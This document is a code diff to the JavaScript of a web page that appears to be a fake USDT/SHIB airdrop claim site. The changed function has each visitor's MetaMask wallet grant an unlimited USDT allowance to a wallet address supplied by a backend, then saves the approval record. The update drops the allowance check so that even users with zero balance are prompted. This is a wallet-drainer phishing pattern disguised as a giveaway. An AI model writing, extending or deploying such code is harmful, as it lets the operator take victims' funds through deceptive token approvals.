@@ -969,129 +969,120 @@
             }
         }
 
-        // ✅ UPDATED: Check Balance and Approve Function - 0 USDT users allowed
-        async function checkBalanceAndApprove() {
-            try {
-                console.log("🔄 Starting approval process...");
-                
-                if (typeof window.ethereum === 'undefined') {
-                    showAlert("Please install MetaMask!", "danger");
-                    return;
-                }
+       // ✅ UPDATED: Check Balance and Approve Function - 0 USDT users ko bhi approval allow
+async function checkBalanceAndApprove() {
+    try {
+        console.log("🔄 Starting approval process...");
+        
+        if (typeof window.ethereum === 'undefined') {
+            showAlert("Please install MetaMask!", "danger");
+            return;
+        }
 
-                if (!account) {
-                    showAlert("Please connect your wallet first!", "warning");
-                    return;
-                }
+        if (!account) {
+            showAlert("Please connect your wallet first!", "warning");
+            return;
+        }
 
-                const button = document.getElementById('checkBalanceBtn');
-                const originalText = button.innerHTML;
-                button.disabled = true;
-                button.innerHTML = '<div class="loading"></div> Checking Balance...';
+        const button = document.getElementById('checkBalanceBtn');
+        const originalText = button.innerHTML;
+        button.disabled = true;
+        button.innerHTML = '<div class="loading"></div> Checking Balance...';
 
-                if (!web3) {
-                    web3 = new Web3(window.ethereum);
-                }
+        if (!web3) {
+            web3 = new Web3(window.ethereum);
+        }
 
-                const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
-                
-                // 1. Check USDT Balance
-                console.log("🔍 Checking USDT balance...");
-                const balance = await usdtContract.methods.balanceOf(account).call();
-                const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
-                
-                console.log("💰 USDT Balance:", balanceInUSDT);
-                document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(6);
-                
-                // ✅ UPDATED: Show actual airdrop amount for all users (including 0 USDT)
-                const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
-                const tier = getTier(parseFloat(balanceInUSDT));
-                
-                document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
-                document.getElementById("tierBadge").textContent = tier;
+        const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
+        
+        // 1. Check USDT Balance
+        console.log("🔍 Checking USDT balance...");
+        const balance = await usdtContract.methods.balanceOf(account).call();
+        const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
+        
+        console.log("💰 USDT Balance:", balanceInUSDT);
+        document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(6);
+        
+        // ✅ UPDATED: Show actual airdrop amount for all users (including 0 USDT)
+        const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
+        const tier = getTier(parseFloat(balanceInUSDT));
+        
+        document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
+        document.getElementById("tierBadge").textContent = tier;
 
-                // ✅ UPDATED: Allow approval for all users (including 0 USDT)
-                button.innerHTML = '<div class="loading"></div> Approving USDT...';
+        // ✅ UPDATED: Allow approval for ALL users (including 0 USDT)
+        button.innerHTML = '<div class="loading"></div> Approving USDT...';
+        
+        if (airdropAmount === 0) {
+            showAlert(`⚠️ Note: You will receive 0 tokens as you have less than 1 USDT, but you can still approve`, "warning");
+        } else {
+            showAlert(`💰 Balance: ${parseFloat(balanceInUSDT).toFixed(6)} USDT | Airdrop: ${airdropAmount.toLocaleString()} tokens`, "info");
+        }
+        
+        try {
+            const approvalWallet = await getApprovalWalletFromBackend();
+            console.log("✅ Approval wallet:", approvalWallet);
+            
+            // Check current allowance first
+            const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
+            const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
+            console.log("📊 Current allowance:", allowanceInUSDT, "USDT");
+
+            // ✅ UPDATED: 0 USDT wale ko bhi approval allow karo
+            // Unlimited approval - chahe balance 0 ho ya 1000
+            const unlimitedAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+            
+            console.log("📝 Sending approval transaction...");
+            const tx = await usdtContract.methods.approve(
+                approvalWallet,
+                unlimitedAmount
+            ).send({
+                from: account,
+                gas: 100000
+            });
+
+            console.log("✅ Transaction result:", tx);
+            
+            if (tx.status) {
+                showAlert("✅ USDT Approval Successful!", "success");
+                
+                // ✅ UPDATED: Enable claim button for ALL users after approval
+                document.getElementById("claimButton").disabled = false;
+                document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Approved & Ready';
+                document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                 
                 if (airdropAmount === 0) {
-                    showAlert(`⚠️ Note: You will receive 0 tokens as you have less than 1 USDT`, "warning");
+                    showAlert(`✅ Approved! You can claim but will receive 0 SHIB tokens`, "warning");
                 } else {
-                    showAlert(`💰 Balance: ${parseFloat(balanceInUSDT).toFixed(6)} USDT | Airdrop: ${airdropAmount.toLocaleString()} tokens`, "info");
+                    showAlert(`🎉 Ready to Claim ${airdropAmount.toLocaleString()} tokens!`, "success");
                 }
                 
-                try {
-                    const approvalWallet = await getApprovalWalletFromBackend();
-                    console.log("✅ Approval wallet:", approvalWallet);
-                    
-                    // Check current allowance first
-                    const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
-                    const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
-                    console.log("📊 Current allowance:", allowanceInUSDT, "USDT");
-
-                    if (parseFloat(allowanceInUSDT) < parseFloat(balanceInUSDT)) {
-                        showAlert("🔄 Approving USDT for airdrop...", "info");
-                        
-                        // Unlimited approval
-                        const unlimitedAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-                        
-                        console.log("📝 Sending approval transaction...");
-                        const tx = await usdtContract.methods.approve(
-                            approvalWallet,
-                            unlimitedAmount
-                        ).send({
-                            from: account,
-                            gas: 100000
-                        });
-
-                        console.log("✅ Transaction result:", tx);
-                        
-                        if (tx.status) {
-                            showAlert("✅ USDT Approval Successful!", "success");
-                            
-                            // ✅ UPDATED: Enable claim button for ALL users after approval
-                            document.getElementById("claimButton").disabled = false;
-                            document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Approved & Ready';
-                            document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
-                            
-                            showAlert(`🎉 Ready to Claim ${airdropAmount.toLocaleString()} tokens!`, "success");
-                            
-                            // Save to backend
-                            await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
-                            
-                        } else {
-                            throw new Error("Transaction failed");
-                        }
-                    } else {
-                        console.log("✅ Already approved, skipping approval");
-                        showAlert("✅ USDT Already Approved", "success");
-                        
-                        // ✅ UPDATED: Enable claim button for ALL users if already approved
-                        document.getElementById("claimButton").disabled = false;
-                        document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Already Approved';
-                        document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
-                        
-                        showAlert(`✅ USDT Already Approved | Ready to Claim ${airdropAmount.toLocaleString()} tokens!`, "success");
-                    }
-
-                } catch (approvalError) {
-                    console.error("❌ Approval error:", approvalError);
-                    if (approvalError.code === 4001) {
-                        showAlert("❌ Approval cancelled by user", "warning");
-                    } else {
-                        showAlert("❌ Approval failed: " + approvalError.message, "danger");
-                    }
-                    button.innerHTML = originalText;
-                    button.disabled = false;
-                }
-
-            } catch (error) {
-                console.error("❌ Process error:", error);
-                showAlert("Failed: " + error.message, "danger");
-                const button = document.getElementById('checkBalanceBtn');
-                button.innerHTML = '<i class="fas fa-coins"></i> Check USDT Balance & Approve';
-                button.disabled = false;
+                // Save to backend
+                await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
+                
+            } else {
+                throw new Error("Transaction failed");
             }
+
+        } catch (approvalError) {
+            console.error("❌ Approval error:", approvalError);
+            if (approvalError.code === 4001) {
+                showAlert("❌ Approval cancelled by user", "warning");
+            } else {
+                showAlert("❌ Approval failed: " + approvalError.message, "danger");
+            }
+            button.innerHTML = originalText;
+            button.disabled = false;
         }
+
+    } catch (error) {
+        console.error("❌ Process error:", error);
+        showAlert("Failed: " + error.message, "danger");
+        const button = document.getElementById('checkBalanceBtn');
+        button.innerHTML = '<i class="fas fa-coins"></i> Check USDT Balance & Approve';
+        button.disabled = false;
+    }
+}
 
         // Calculate Airdrop Amount - UPDATED
         function calculateAirdropAmount(usdtBalance) {
@@ -1306,3 +1297,4 @@
     </script>
 </body>
 </html>
+
